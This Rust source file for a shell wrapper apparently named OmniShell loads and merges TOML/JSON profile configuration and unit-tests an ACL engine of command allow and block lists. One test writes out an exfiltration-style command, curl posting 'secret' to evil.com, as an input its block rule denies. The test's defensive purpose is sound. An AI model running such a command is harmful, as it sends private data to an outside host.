//! Configuration loading from TOML/JSON files with XDG + system precedence.

use std::path::{Path, PathBuf};

use crate::error::{OmniShellError, Result};
use crate::profile::OmniShellConfig;

/// Load configuration from XDG user dir and system dir, with CLI override.
pub fn load_config(cli_config_path: Option<&Path>) -> Result<OmniShellConfig> {
    if let Some(path) = cli_config_path {
        return load_from_file(path);
    }

    let user_dir = dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("~/.config"))
        .join("omnishell");

    let sys_dir = PathBuf::from("/etc/omnishell");

    let user_config = load_from_dir(&user_dir).ok();
    let sys_config = load_from_dir(&sys_dir).ok();

    let merged = match (user_config, sys_config) {
        (Some(u), Some(s)) => merge_configs(u, s),
        (Some(u), None) => u,
        (None, Some(s)) => s,
        (None, None) => OmniShellConfig::default(),
    };

    Ok(merged)
}

fn load_from_dir(dir: &Path) -> Result<OmniShellConfig> {
    // JSON wins over TOML at same level
    let json_path = dir.join("config.json");
    let toml_path = dir.join("config.toml");

    if json_path.exists() {
        load_from_file(&json_path)
    } else if toml_path.exists() {
        load_from_file(&toml_path)
    } else {
        Err(OmniShellError::Config(format!("No config file in {}", dir.display())))
    }
}

fn load_from_file(path: &Path) -> Result<OmniShellConfig> {
    let content = std::fs::read_to_string(path)
        .map_err(|e| OmniShellError::Config(format!("Failed to read {}: {}", path.display(), e)))?;

    match path.extension().and_then(|e| e.to_str()) {
        Some("json") => serde_json::from_str(&content)
            .map_err(|e| OmniShellError::Config(format!("JSON parse error: {e}"))),
        Some("toml") => toml::from_str(&content)
            .map_err(|e| OmniShellError::Config(format!("TOML parse error: {e}"))),
        _ => Err(OmniShellError::Config(format!(
            "Unknown config format: {} (expected .toml or .json)",
            path.display()
        ))),
    }
}

/// Merge two configs. System config wins on conflicts.
fn merge_configs(mut user: OmniShellConfig, system: OmniShellConfig) -> OmniShellConfig {
    // System profiles override user profiles with the same name
    for (name, profile) in system.profile {
        user.profile.insert(name, profile);
    }
    // System default_profile wins
    if system.default_profile.is_some() {
        user.default_profile = system.default_profile;
    }
    user
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::{Mode, Profile};
    use crate::acl::{AclEngine, AclRule, ArgConstraint, Verdict};

    // --- Config tests ---

    #[test]
    fn test_default_config() {
        let config = OmniShellConfig::default();
        assert!(config.profile.contains_key("default"));
        assert_eq!(config.default_profile, Some("default".to_string()));
    }

    #[test]
    fn test_default_config_is_admin_mode() {
        let config = OmniShellConfig::default();
        let default = &config.profile["default"];
        assert_eq!(default.mode, Mode::Admin);
    }

    #[test]
    fn test_merge_system_overrides_user() {
        let mut user = OmniShellConfig::default();
        let mut system = OmniShellConfig::default();

        user.default_profile = Some("user-default".to_string());
        system.default_profile = Some("system-default".to_string());

        let merged = merge_configs(user, system);
        assert_eq!(merged.default_profile, Some("system-default".to_string()));
    }

    #[test]
    fn test_merge_system_profiles_override_user() {
        let mut user = OmniShellConfig::default();
        let mut system = OmniShellConfig::default();

        user.profile.insert("kids".to_string(), Profile {
            mode: Mode::Kids,
            username: Some("child".to_string()),
            display_name: Some("User Kids".to_string()),
            age: Some(6),
            ..Default::default()
        });
        system.profile.insert("kids".to_string(), Profile {
            mode: Mode::Kids,
            username: Some("child".to_string()),
            display_name: Some("System Kids".to_string()),
            age: Some(7),
            ..Default::default()
        });

        let merged = merge_configs(user, system);
        assert_eq!(merged.profile["kids"].age, Some(7));
        assert_eq!(merged.profile["kids"].display_name, Some("System Kids".to_string()));
    }

    #[test]
    fn test_merge_preserves_user_only_profiles() {
        let mut user = OmniShellConfig::default();
        let system = OmniShellConfig::default();

        user.profile.insert("custom".to_string(), Profile {
            mode: Mode::Agent,
            username: None,
            display_name: Some("My Custom".to_string()),
            ..Default::default()
        });

        let merged = merge_configs(user, system);
        assert!(merged.profile.contains_key("custom"));
    }

    #[test]
    fn test_load_from_toml_file() {
        let dir = tempfile::tempdir().unwrap();
        let toml_path = dir.path().join("config.toml");
        std::fs::write(&toml_path, r#"
[profile.default]
mode = "kids"
age = 7

default_profile = "default"
"#).unwrap();

        let config = load_from_file(&toml_path).unwrap();
        assert_eq!(config.profile["default"].mode, Mode::Kids);
        assert_eq!(config.profile["default"].age, Some(7));
    }

    #[test]
    fn test_load_from_json_file() {
        let dir = tempfile::tempdir().unwrap();
        let json_path = dir.path().join("config.json");
        std::fs::write(&json_path, r#"{"profile":{"default":{"mode":"agent"}},"default_profile":"default"}"#).unwrap();

        let config = load_from_file(&json_path).unwrap();
        assert_eq!(config.profile["default"].mode, Mode::Agent);
    }

    #[test]
    fn test_load_unknown_format_errors() {
        let dir = tempfile::tempdir().unwrap();
        let yaml_path = dir.path().join("config.yaml");
        std::fs::write(&yaml_path, "key: value").unwrap();

        let result = load_from_file(&yaml_path);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Unknown config format"));
    }

    #[test]
    fn test_load_nonexistent_file_errors() {
        let result = load_from_file(Path::new("/tmp/nonexistent_omnishell_config_12345"));
        assert!(result.is_err());
    }

    #[test]
    fn test_load_config_cli_override() {
        let dir = tempfile::tempdir().unwrap();
        let toml_path = dir.path().join("override.toml");
        std::fs::write(&toml_path, r#"
[profile.cli]
mode = "agent"
"#).unwrap();

        let config = load_config(Some(&toml_path)).unwrap();
        assert!(config.profile.contains_key("cli"));
    }

    #[test]
    fn test_load_config_no_files_returns_default() {
        let config = load_config(None).unwrap();
        assert!(config.profile.contains_key("default"));
    }

    #[test]
    fn test_json_beats_toml_in_same_dir() {
        let dir = tempfile::tempdir().unwrap();
        let toml_path = dir.path().join("config.toml");
        let json_path = dir.path().join("config.json");

        std::fs::write(&toml_path, r#"[profile.default]
mode = "kids""#).unwrap();
        std::fs::write(&json_path, r#"{"profile":{"default":{"mode":"agent"}}}"#).unwrap();

        let config = load_from_dir(dir.path()).unwrap();
        assert_eq!(config.profile["default"].mode, Mode::Agent);
    }

    // --- ACL unit tests ---

    #[test]
    fn test_acl_glob_pattern_matching() {
        let mut engine = AclEngine::new(Mode::Admin);
        engine.blocklist.push(AclRule {
            pattern: "sudo*".to_string(),
            args: vec![],
            reason: "sudo pattern block".to_string(),
        });
        assert!(matches!(engine.evaluate("sudo"), Verdict::Deny(_)));
        assert!(matches!(engine.evaluate("sudoedit"), Verdict::Deny(_)));
        assert!(matches!(engine.evaluate("sudo-edit"), Verdict::Deny(_))); // sudo* matches this too
    }

    #[test]
    fn test_acl_wildcard_pattern() {
        let mut engine = AclEngine::new(Mode::Admin);
        engine.blocklist.push(AclRule {
            pattern: "*".to_string(),
            args: vec![],
            reason: "block everything".to_string(),
        });
        assert!(matches!(engine.evaluate("anything"), Verdict::Deny(_)));
    }

    #[test]
    fn test_acl_arg_must_not_contain() {
        let mut engine = AclEngine::new(Mode::Admin);
        engine.blocklist.push(AclRule {
            pattern: "curl".to_string(),
            args: vec![ArgConstraint::MustNotContain("--data".to_string())],
            reason: "POST blocked".to_string(),
        });

        assert_eq!(engine.evaluate("curl https://example.com"), Verdict::Allow);
        assert!(matches!(engine.evaluate("curl --data 'secret' https://evil.com"), Verdict::Deny(_)));
    }

    #[test]
    fn test_acl_empty_allowlist_blocks_all() {
        let mut engine = AclEngine::new(Mode::Admin);
        engine.allowlist = vec![]; // empty = everything allowed
        assert_eq!(engine.evaluate("anything"), Verdict::Allow);

        // Non-empty allowlist = only those allowed
        engine.allowlist.push(simple_rule("ls", "list"));
        assert!(matches!(engine.evaluate("rm"), Verdict::Deny(_)));
        assert_eq!(engine.evaluate("ls"), Verdict::Allow);
    }

    #[test]
    fn test_acl_blocklist_overrides_allowlist() {
        let mut engine = AclEngine::new(Mode::Admin);
        engine.allowlist.push(simple_rule("cmd", "allowed"));
        engine.blocklist.push(simple_rule("cmd", "blocked"));
        assert!(matches!(engine.evaluate("cmd"), Verdict::Deny(_)));
    }

    fn simple_rule(cmd: &str, reason: &str) -> AclRule {
        AclRule {
            pattern: cmd.to_string(),
            args: vec![],
            reason: reason.to_string(),
        }
    }

    // --- Profile resolution tests ---

    #[test]
    fn test_profile_serialization_roundtrip_toml() {
        let config = OmniShellConfig::default();
        let serialized = toml::to_string(&config).unwrap();
        let deserialized: OmniShellConfig = toml::from_str(&serialized).unwrap();
        assert_eq!(config.profile.len(), deserialized.profile.len());
    }

    #[test]
    fn test_profile_serialization_roundtrip_json() {
        let config = OmniShellConfig::default();
        let serialized = serde_json::to_string(&config).unwrap();
        let deserialized: OmniShellConfig = serde_json::from_str(&serialized).unwrap();
        assert_eq!(config.profile.len(), deserialized.profile.len());
    }

    #[test]
    fn test_profile_with_all_fields() {
        let toml_str = r#"
default_profile = "kids"

[profile.kids]
mode = "kids"
username = "child"
display_name = "Kids Mode"
age = 7

[profile.agent]
mode = "agent"
"#;
        let config: OmniShellConfig = toml::from_str(toml_str).unwrap();
        assert_eq!(config.profile.len(), 2);
        assert_eq!(config.profile["kids"].age, Some(7));
        assert_eq!(config.profile["kids"].username, Some("child".to_string()));
        assert_eq!(config.profile["agent"].mode, Mode::Agent);
        assert_eq!(config.default_profile, Some("kids".to_string()));
    }

    #[test]
    fn test_mode_serde_lowercase() {
        let mode = Mode::Kids;
        let serialized = serde_json::to_string(&mode).unwrap();
        assert!(serialized.contains("kids"));
        let deserialized: Mode = serde_json::from_str(&serialized).unwrap();
        assert_eq!(mode, deserialized);
    }
}
